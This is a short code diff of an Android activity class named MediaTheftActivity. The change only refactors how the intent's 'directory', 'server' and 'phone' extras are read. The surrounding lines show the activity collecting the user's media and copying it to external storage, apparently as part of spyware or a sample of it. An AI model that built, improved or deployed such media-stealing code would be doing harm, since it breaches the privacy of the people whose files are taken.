@@ -29,9 +29,10 @@ public class MediaTheftActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        String directory = getIntent().getStringExtra("directory");
-        String server = getIntent().getStringExtra("server");
-        String phone = getIntent().getStringExtra("phone");
+        Intent intent = getIntent();
+        String directory = intent.getStringExtra("directory");
+        String server = intent.getStringExtra("server");
+        String phone = intent.getStringExtra("phone");
 
         ArrayList<Uri> media = collectUserMedia();
         copyToExternalStorage(media);
